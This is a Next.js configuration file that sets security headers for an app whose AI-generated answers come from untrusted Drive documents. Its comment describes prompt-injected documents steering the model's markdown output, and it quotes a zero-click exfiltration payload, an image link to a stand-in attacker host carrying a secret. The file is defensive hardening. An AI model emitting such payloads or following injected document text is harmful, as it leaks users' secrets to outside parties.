// Copyright (c) 2026 Benjamin Lau
// SPDX-License-Identifier: MIT

import type { NextConfig } from "next";

// Security headers applied to every response. The CSP is deliberately a TARGETED
// allowlist, not a full lockdown: a synthesized answer is model output derived
// from untrusted Drive file content and is rendered as markdown in the browser, so
// a prompt-injected document could try to make the answer carry an exfiltration
// payload. These directives close the browser-side exfiltration channels while
// leaving script-src/style-src/default-src UNSET so Next.js's inline hydration
// scripts/styles keep working without a per-request nonce (a strict script-src
// needs nonce middleware and is tracked as a follow-up — see docs/security.md).
//
// - img-src 'self' data:  — blocks `![](https://attacker/x?d=<secret>)` from
//   auto-loading, the zero-click exfiltration vector. The UI loads no external
//   images, so this costs nothing.
// - connect-src 'self'    — blocks fetch/XHR/beacon/websocket exfil to other
//   origins; model API calls run server-side, so the browser only talks to us.
// - frame-ancestors 'none' / object-src 'none' / base-uri 'self' / form-action
//   'self' — standard clickjacking / plugin / base-tag / form-hijack hardening.
const contentSecurityPolicy = [
  "img-src 'self' data:",
  "connect-src 'self'",
  "frame-ancestors 'none'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'"
].join("; ");

const securityHeaders = [
  { key: "Content-Security-Policy", value: contentSecurityPolicy },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" }
];

const nextConfig: NextConfig = {
  reactStrictMode: true,
  output: "standalone",
  serverExternalPackages: ["unpdf", "mammoth", "jszip", "undici"],
  async headers() {
    return [{ source: "/:path*", headers: securityHeaders }];
  }
};

export default nextConfig;
